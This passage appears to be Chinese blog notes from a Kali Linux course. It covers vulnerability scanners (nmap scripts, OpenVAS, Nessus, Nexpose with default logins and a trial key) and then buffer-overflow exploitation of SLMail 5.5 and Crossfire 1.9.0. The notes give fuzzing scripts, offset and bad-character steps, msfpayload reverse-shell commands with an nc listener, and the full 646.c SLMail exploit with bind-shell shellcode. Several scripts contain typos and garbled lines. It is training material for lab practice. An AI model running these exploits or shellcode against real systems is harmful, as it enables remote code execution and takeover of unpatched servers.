<li>产品名称</li>
<li>影响度量<br>漏洞管理<ul>
<li>周期性扫描跟踪漏洞</li>
<li>高危漏洞优先处理</li>
<li>扫描注意事项</li>
<li>漏洞管理三要素</li>
<li>准确性sssss9</li>
<li>时间</li>
<li>资源<br>NMAP  </li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>nmap 扫描脚本<ul>
<li>400+</li>
<li>分类</li>
</ul>
</li>
<li>cat /usr/share/nmap/scripts/script.db</li>
<li>grep vuln /usr/share/nmap/scripts/script.db | cut -d “&quot; -f 2</li>
<li>cat /usr/share/nmap/scripts/smb-check-vulns.nse</li>
<li>smb-check-vulns.nse<ul>
<li>nmap -sU –script=smb-check-vulns.nse –script-args=unsafe=1 -p U:137,139,445 1.1.1.1</li>
<li>MS08-067</li>
</ul>
</li>
<li>smb-vuln-ms 10-061.nse<ul>
<li>Stuxnet蠕虫利用的4个漏洞之一</li>
<li>Print Spooler权限不当 打印请求可在系统目录可创建文件,执行任意代码</li>
<li>LANMAN API 枚举共享打印机</li>
<li>远程共享打印机名称</li>
<li>smb-enum-shares枚举共享<ul>
<li>身份认证参数-smbuser,smbpassword</li>
<li>nmap -p445 –script=smb-enum-shares.nse –script-args=smbuser=admin,smbpassword=pass 1.1.1.1</li>
</ul>
</li>
<li>Windows XP,Server 2003 SP2,Vista,Server 2008,win7</li>
</ul>
</li>
<li>影响扫描结果的因素<br>弱点扫描器-OPENVAS<ul>
<li>Openvas</li>
</ul>
</li>
<li>Nessus项目分支</li>
<li>管理目标系统的漏洞</li>
<li>免费开源</li>
<li>kali默认安装.但未配置和启动<ul>
<li>早期Openvas配置</li>
</ul>
</li>
<li>安装</li>
<li>创建证书</li>
<li>同步弱点数据库</li>
<li>重建数据库</li>
<li>备份数据库</li>
<li>启动服务装入插件</li>
<li>创建管理员账号</li>
<li>创建普通用户账号</li>
<li>配置服务侦听端口</li>
<li>安装验证<br><img src="https://s2.ax1x.com/2020/03/01/3cm1HO.png" alt="3cm1HO.png"><ul>
<li>Openvas组件</li>
</ul>
</li>
<li>OpenVAS Manager  <ul>
<li>控制scanner和其他manager的中心组件</li>
<li>控制中心数据库,保存用户配置及扫描结果</li>
<li>客户端使用基于XML的无状态OMP协议与通信</li>
<li>集中排序筛选,使客户端获得一致展现</li>
</ul>
</li>
<li>OpenScanner<ul>
<li>具体执行Network Vulnerability Tests(NVTs)</li>
<li>NVTs 每天通过Feed更新</li>
<li>受Manager控制</li>
</ul>
</li>
<li>OSP Scanner<ul>
<li>可以统一管理多个scanner</li>
<li>将一组scanner作为一个对象交给manager</li>
</ul>
</li>
<li>Greebone Security Assistant(GSA)<ul>
<li>提供Web Service</li>
</ul>
</li>
<li>OpenVAS CLI<ul>
<li>omp命令行工具,可实现批处理控制manager</li>
</ul>
</li>
<li>更新很快<ul>
<li>所有找到的资料集合都已不同程度的过时了<ul>
<li>现在安装Openvas</li>
</ul>
</li>
</ul>
</li>
<li>初始化安装<ul>
<li>openvas-setup</li>
</ul>
</li>
<li>检查安装结果<ul>
<li>openvas-check-setup</li>
</ul>
</li>
<li>查看当前账号<ul>
<li>openvasmd –list-users</li>
</ul>
</li>
<li>修改账号密码<ul>
<li>openvasmd –user=admin-new -password=password</li>
</ul>
</li>
<li>升级<ul>
<li>openvas-feed-update<ul>
<li>扫描配置</li>
</ul>
</li>
</ul>
</li>
<li>扫描windows</li>
<li>扫描LInux</li>
<li>扫描网络设备<ul>
<li>扫描任务</li>
</ul>
</li>
<li>进度</li>
<li>报告<ul>
<li>小结</li>
</ul>
</li>
<li>不是秘笈而是经验</li>
<li>vi /usr/bin/openvas-start<br>NESSUS<ul>
<li>家庭版<ul>
<li>免费</li>
</ul>
</li>
<li>专业版<ul>
<li>收费,无限的并发连接</li>
</ul>
</li>
<li>下载</li>
<li><a href="http://www.tenable.com/products/nessus/select-your-operating-system" target="_blank" rel="noopener">http://www.tenable.com/products/nessus/select-your-operating-system</a></li>
<li>安装</li>
<li>dpkg -i </li>
<li>安装路径: /opt/nessus</li>
<li>启动服务</li>
<li>/etc/init.d/nessusd start</li>
<li>策略</li>
<li>扫描</li>
<li>扫描主机</li>
<li>扫描windows</li>
<li>扫描linux</li>
<li>扫描网络设备</li>
<li>扫描 web server</li>
<li>报告</li>
<li>调度<br>NEXPOSE</li>
<li>Rapid 7</li>
<li>Nexpose</li>
<li>完整的漏洞管理实现</li>
<li>环境准备</li>
<li>建立 VM 4G 内存</li>
<li><a href="http://downloads2.rapid7/download/NeXpose-v4/NexposeVA.ova" target="_blank" rel="noopener">http://downloads2.rapid7/download/NeXpose-v4/NexposeVA.ova</a></li>
<li><a href="https://IP_addr:3780" target="_blank" rel="noopener">https://IP_addr:3780</a> (nxdmin/nxpassword)</li>
<li>操作系统账号密码:nexpose</li>
<li><a href="http://www.rapid7.com/products/nexpose/virtual-appliance-enterprise.jsp" target="_blank" rel="noopener">http://www.rapid7.com/products/nexpose/virtual-appliance-enterprise.jsp</a></li>
<li>K3LQ-5PPS-RTS5-LTS5(14天后到期)</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="Kali-Linux-从入门到精通-十-漏洞挖掘之缓冲区溢出"><a href="#Kali-Linux-从入门到精通-十-漏洞挖掘之缓冲区溢出" class="headerlink" title="Kali Linux 从入门到精通(十)-漏洞挖掘之缓冲区溢出"></a>Kali Linux 从入门到精通(十)-漏洞挖掘之缓冲区溢出</h2><blockquote>
<p>程序漏洞从哪里来?</p>
<ul>
<li>罪恶的根源:变量</li>
<li>数据与代码边界不清(注入攻击)</li>
<li>最简漏洞原理-shell 脚本漏洞(本质:输入数据本身,程序本身没做检查导致)<br>缓冲区溢出</li>
<li>当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被”称暴”,从而覆盖了相邻内存区域的数据</li>
<li>成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务控制权等后果’<br>如何发现漏洞?<ul>
<li>源码审计</li>
<li>逆向工程</li>
<li>模糊测试<ul>
<li>向程序堆栈半随机的数据,根据内存变化判断溢出</li>
<li>数据生成器,生成随机,半随机数据</li>
<li>测试工具,识别溢出漏洞(动态调试工具:IDA,OD)<br>Windows系统缓冲区溢出</li>
</ul>
</li>
<li>FUZZING(模糊测试)<ul>
<li>准备环境<ul>
<li>SLMail 5.5.0 Mail Server</li>
<li>immunityDebugger_1_85_setup.exe</li>
<li>mona.py</li>
</ul>
</li>
<li>POP3 PASS 命令存在缓冲区溢出漏洞</li>
<li>无需身份验证实现远程代码执行</li>
<li>windows防护机制<ul>
<li>DEP:阻止代码从数据页被执行(软硬件实现)</li>
<li>ASLR:随机内存地址加载执行程序和DLL,每次重启地址变化 </li>
</ul>
</li>
</ul>
</li>
<li>POP3<ul>
<li>NC 110 端口</li>
<li>了解未知协议<ul>
<li>Wireshark</li>
<li>RFC</li>
</ul>
</li>
<li>01.py<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> #!/bin/python</span><br><span class="line"> import socket</span><br><span class="line"> s=socket(socket.AF_INET,socket.SOCK_STREM)</span><br><span class="line"> try:</span><br><span class="line">      print &quot;\nSending evil buffer...&quot;</span><br><span class="line">      s.connect((&apos;1.1.1.1&apos;,110))</span><br><span class="line">      data=s.recv(1024)</span><br><span class="line">      print data</span><br><span class="line"></span><br><span class="line">      s.send(&apos;USER xxx&apos;+&apos;\r\n&apos;)</span><br><span class="line">      data=s.recv(1024)</span><br><span class="line">      print data</span><br><span class="line">      </span><br><span class="line">      s.send(&apos;PASS test\r\n&apos;)</span><br><span class="line">      data=s.recv(1024)</span><br><span class="line">      print data</span><br><span class="line"></span><br><span class="line">      s.close()</span><br><span class="line">      print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">      print &quot;Could not connext to POP3!&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<ul>
<li><p>FUZZING(way 1)</p>
<ul>
<li>测试PASS 命令收到大量数据时是否发生溢出</li>
<li>EIP寄存器存放下一条指令的地址</li>
<li>02.py<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket </span><br><span class="line">buffer=[&quot;A&quot;]</span><br><span class="line">counter=100</span><br><span class="line">while len(buffer)&lt;=50:</span><br><span class="line">    buffer.append(&quot;A&quot;*counter)</span><br><span class="line">    counter=counter+200</span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing PASS with %s bytes&quot; % len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    connect=s.connect((&apos;1.1.1.1.1&apos;,110))</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+string+&apos;\r\n&apos;)</span><br><span class="line">    s.send(&apos;QUIT\r\n&apos;)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>FUZZING(way 2)</p>
<ul>
<li><p>2700个字符实现EIP溢出</p>
</li>
<li><p>03.py</p>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import socket </span><br><span class="line">s=soket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2600(不断改变数字)</span><br><span class="line">try:</span><br><span class="line">   print &quot;\nSending evil buffer...&quot;</span><br><span class="line">   s.connect((&apos;1.1.1.1&apos;,110))</span><br><span class="line">   data=s.recv(1024)</span><br><span class="line">   s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">   print &apos;\nDone!&apos;</span><br><span class="line">except:</span><br><span class="line">   print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>找到精确溢出的4个字节</p>
<ul>
<li>二分法(2700-&gt;2600-&gt;2650)</li>
<li>唯一字串法<ul>
<li>kali生成唯一字符串:/sur/share/metasploit/tools/pattern_ create.rb 2700</li>
</ul>
</li>
<li>04.py </li>
<li>05.py</li>
</ul>
</li>
<li><p>思路: 将EIP修改为shellcode代码的内存地址,将shellcode写入到该地址空间,程序读取EIP寄存器数值,并跳转到shellcode代码段执行 </p>
</li>
<li><p>寻找可存放的内存地址空间</p>
</li>
<li><p>06.py</p>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&quot;A&quot;*2606+&quot;B&quot;*4+C*(3500-2606-4)  # 假设EXP寄存器最大可存放3500个字符</span><br><span class="line">try:</span><br><span class="line">   print &quot;\nSending ing evil buffer...&quot;</span><br><span class="line">   s.connect((&apos;1.1.1.1&apos;,110))</span><br><span class="line">   date=s.recv(1024)</span><br><span class="line">   s.send(&quot;USER TEST&quot;+&apos;\r\n&apos;)</span><br><span class="line">   date=s.recv(1024)</span><br><span class="line">   s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)\]]]]]]]][[][][][][][][][][ ]]</span><br><span class="line">   print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">   print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>FUZZING:</p>
<ul>
<li>不同类型的程序.协议,漏洞,会将某些字符认为是坏字符,这些字符有固定用途</li>
<li>返回地址,shellcode,buffer中都不能出现坏字符</li>
<li>null (0x00) 空字符,用于终止字符串的拷贝操作</li>
<li>return (0x0D) 回车操作,表示POP3 PASS 命令输入完成</li>
<li>思路:<pre><code>- 发送0x00-0xff 256个字符,查找所有坏字符</code></pre></li>
<li>07.py<ul>
<li>坏字符:0x0A,0x00,0x0D<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr]]bin/python</span><br><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=从0x00-0xff</span><br><span class="line">buffer=&quot;A&quot;*2606+&quot;B&quot;*4+badchars  </span><br><span class="line">try:</span><br><span class="line">   print &quot;\nSending ing evil buffer...&quot;</span><br><span class="line">   s.connect((&apos;1.1.1.1&apos;,110))</span><br><span class="line">   date=s.recv(1024)</span><br><span class="line">   s.send(&quot;USER TEST&quot;+&apos;\r\n&apos;)</span><br><span class="line">   date=s.recv(1024)</span><br><span class="line">   s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">   print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">   print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<ul>
<li>FUZZING:<ul>
<li>重定向数据流<ul>
<li>用ESP的地址替换EIP的值</li>
<li>但是ESP地址变化,硬编码不可行</li>
<li>SLMail 线程应用程序,操作系统为每个线程分配一段地址范围,每个线程地址范围不确定</li>
</ul>
</li>
<li>变通思路:<ul>
<li>在内存中寻找地址固定的系统模块</li>
<li>在模块中寻找JMP ESP指令的地址跳转,再由该指令间接跳转到ESP,从而执行shellcode</li>
<li>mona.py脚本识别内存模块,搜索”return address”是JMP ESP指令的模块</li>
<li>寻找无EDP,ASLR保护的内存地址</li>
<li>内存地址不包含坏字符<br>  mona find -s “二进制地址(可使用16进制转换工具)” -m xxx.dll</li>
<li>生成shellcode</li>
<li>Scratch</li>
<li>./msfpayload -l<br><img src="https://s2.ax1x.com/2020/03/01/3cmfK0.png" alt="3cmfK0.png"></li>
<li>./msfpayload win32_reverse LHOST=192.168.20.8 LPORT=443 -C<br><img src="https://s2.ax1x.com/2020/03/01/3cm22n.png" alt="3cm22n.png"></li>
<li>./msfpayload win32_reverse LHOST=10.0.2.15 444 R | ./msfencode -b “\x00\x0a\x0d”</li>
<li>nc -vlp 443</li>
<li>09.py<ul>
<li>\x90:nop指令</li>
<li>防止shellcode被清除前几个字节</li>
<li>提权侵入,拿shell</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>shellcode执行结束后以exit方式退出整个结束,将导致邮件服务崩溃</p>
</li>
<li><p>Smail是一个基于线程的应用,使用ExitThread方式可避免整个服务崩溃,可实现重复溢出</p>
<blockquote>
<p>FUZZING:远程桌面操控受控机</p>
</blockquote>
</li>
<li><p>windows:配置信息在注册表</p>
</li>
<li><p>RegSnap 工具</p>
</li>
<li><p>提权后远程操控指令:</p>
</li>
</ul>
<blockquote>
<p>Linux缓冲区溢出 - - 穿越火线缓冲区溢出</p>
<ul>
<li>1.环境搭建:<ul>
<li>Crossfire(穿越火线)<ul>
<li>多人在线RPG游戏</li>
<li>1.9.0版本接受入站 scoket连接时存在缓冲区溢出漏洞</li>
</ul>
</li>
<li>调试工具<ul>
<li>edb</li>
</ul>
</li>
<li>运行平台<ul>
<li>Kali i486 虚拟机</li>
</ul>
</li>
</ul>
</li>
<li>2.Fuzzing<ul>
<li>新版本Linux内核会支持内存保护机制<ul>
<li>DEP</li>
<li>ASLR</li>
<li>堆栈 cookies</li>
<li>堆栈粉碎 </li>
</ul>
</li>
<li>本机调试<ul>
<li>ipatbles -A INPUT -p tcp –destination-port 4444 ! -d 127.0.0.1 -j DROP</li>
<li>ipatbles -A INPUT -p tcp –destination-port 13327 ! -d 127.0.0.1 -j DROP</li>
</ul>
</li>
<li>1.01.py<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">#\x41 代表A 精确溢出</span><br><span class="line">crash=&quot;\x41&quot;*4379  </span><br><span class="line"># \x11 设备操作指令 \x90 NOP指令</span><br><span class="line">buffer=&quot;\x11(setup sound &quot;+ crash +&quot;\x90\x00#&quot;</span><br><span class="line"># 建立连接</span><br><span class="line">s=scoket.socket(socket_AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*] Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13327))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</blockquote>
<ul>
<li><p>2.唯一字符串识别EIP精确位置 </p>
<ul>
<li>02.py<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">#\x41 代表A 精确溢出</span><br><span class="line">crash=&apos;A&apos;*4368+&apos;B&apos;*4+&apos;C&apos;*7 </span><br><span class="line"># \x11 设备操作指令 \x90 NOP指令</span><br><span class="line">buffer=&quot;\x11(setup sound &quot;+ crash +&quot;\x90\x00#&quot;</span><br><span class="line"># 建立连接</span><br><span class="line">s=scoket.socket(socket_AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*] Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13327))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>3.思路:shellcode代码置入</p>
<ul>
<li>第一阶段shellcode<ul>
<li>ESP 跳转到 EAX</li>
<li>偏移12个字节</li>
</ul>
</li>
<li>setup sound shellcode2</li>
<li>nasm <ul>
<li>add eax,12</li>
<li>jmp eax</li>
</ul>
</li>
</ul>
</li>
<li><ol start="4">
<li>查找坏字符<ul>
<li>\x00\x0a\0x0d\x20</li>
</ul>
</li>
</ol>
</li>
<li><p>5.shellcode</p>
<ul>
<li>ESP跳转地址</li>
<li>跳转该过程: EIP-&gt;jmp esp-&gt;add  eax 12-&gt;jmp eax</li>
<li>使用msfpayload 生成shellcode<blockquote>
<p>选择和修改EXP</p>
</blockquote>
</li>
</ul>
</li>
<li><p>网上公开的EXP代码</p>
<ul>
<li>选择可信赖的EXP源(虚拟环境中验证)</li>
<li>Exploit-db</li>
<li>SecurityFocus(安全焦点)</li>
<li>Searchsploit</li>
</ul>
</li>
<li><p>有能力修改EXP(Python,Perl,Ruby,C,C++…)</p>
</li>
<li><p>选择和修改EXP</p>
<ul>
<li>646.C<ul>
<li>类unix环境下编译</li>
<li>返回地址与本机环境不符</li>
<li>反弹shell硬编码回连IP地址</li>
<li>缓冲区偏移量与环境不符</li>
<li>目标IP硬编码<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//646.c  SLMAIL REMOTE PASSWD BO 代码</span><br><span class="line">// 需使用gcc进行编译 </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;winsock2.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>// [*] bind 4444<br>unsigned char shellcode[] =<br>“\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45”<br>“\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49”<br>“\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d”<br>“\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66”<br>“\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61”<br>“\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40”<br>“\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32”<br>“\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6”<br>“\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09”<br>“\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0”<br>“\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff”<br>“\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53”<br>“\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff”<br>“\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64”<br>“\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89”<br>“\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab”<br>“\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51”<br>“\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53”<br>“\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6”<br>“\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0”;</p>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```</span><br></pre></td></tr></table></figure>

<p>void exploit(int sock) {<br>      FILE <em>test;<br>      int *ptr;<br>      char userbuf[] = “USER madivan\r\n”;<br>      char evil[3001];<br>      char buf[3012];<br>      char receive[1024];<br>      char nopsled[] = “\x90\x90\x90\x90\x90\x90\x90\x90”<br>                       “\x90\x90\x90\x90\x90\x90\x90\x90”;<br>      memset(buf, 0x00, 3012);<br>      memset(evil, 0x00, 3001);<br>      memset(evil, 0x43, 3000);<br>      ptr = &evil;<br>      ptr = ptr + 652; // 2608<br>      memcpy(ptr, &amp;nopsled, 16);<br>      ptr = ptr + 4;<br>      memcpy(ptr, &amp;shellcode, 317);<br>      *(long</em>)&amp;evil[2600] = 0x7CB41010; // JMP ESP XP 7CB41020 FFE4 JMP ESP</p>
<pre><code>// banner
recv(sock, receive, 200, 0);
printf(&quot;[+] %s&quot;, receive);
// user
printf(&quot;[+] Sending Username...\n&quot;);
send(sock, userbuf, strlen(userbuf), 0);
recv(sock, receive, 200, 0);
printf(&quot;[+] %s&quot;, receive);
// passwd
printf(&quot;[+] Sending Evil buffer...\n&quot;);
sprintf(buf, &quot;PASS %s\r\n&quot;, evil);
//test = fopen(&quot;test.txt&quot;, &quot;w&quot;);
//fprintf(test, &quot;%s&quot;, buf);
//fclose(test);
send(sock, buf, strlen(buf), 0);
printf(&quot;[*] Done! Connect to the host on port 4444...\n\n&quot;);</code></pre><p>}</p>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">int connect_target(char *host, u_short port)</span><br><span class="line">&#123;</span><br><span class="line">    int sock = 0;</span><br><span class="line">    struct hostent *hp;</span><br><span class="line">    WSADATA wsa;</span><br><span class="line">    struct sockaddr_in sa;</span><br><span class="line"></span><br><span class="line">    WSAStartup(MAKEWORD(2,0), &amp;wsa);</span><br><span class="line">    memset(&amp;sa, 0, sizeof(sa));</span><br><span class="line"></span><br><span class="line">    hp = gethostbyname(host);</span><br><span class="line">    if (hp == NULL) &#123;</span><br><span class="line">        printf(&quot;gethostbyname() error!\n&quot;); exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;[+] Connecting to %s\n&quot;, host);</span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line">    sa.sin_port = htons(port);</span><br><span class="line">    sa.sin_addr = **((struct in_addr **) hp-&gt;h_addr_list);</span><br><span class="line"></span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    if (sock &lt; 0)      &#123;</span><br><span class="line">        printf(&quot;[-] socket blah?\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">    if (connect(sock, (struct sockaddr *) &amp;sa, sizeof(sa)) &lt; 0)</span><br><span class="line">        &#123;printf(&quot;[-] connect() blah!\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">          &#125;</span><br><span class="line">    printf(&quot;[+] Connected to %s\n&quot;, host);</span><br><span class="line">    return sock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    int sock = 0;</span><br><span class="line">    int data, port;</span><br><span class="line">    printf(&quot;\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n&quot;);</span><br><span class="line">    printf(&quot;[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n&quot;);</span><br><span class="line">    if ( argc &lt; 2 ) &#123; printf(&quot;usage: slmail-ex.exe &lt;host&gt; \n\n&quot;); exit(0); &#125;</span><br><span class="line">    port = 110;</span><br><span class="line">    sock = connect_target(argv[1], port);</span><br><span class="line">    exploit(sock);</span><br><span class="line">    closesocket(sock);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

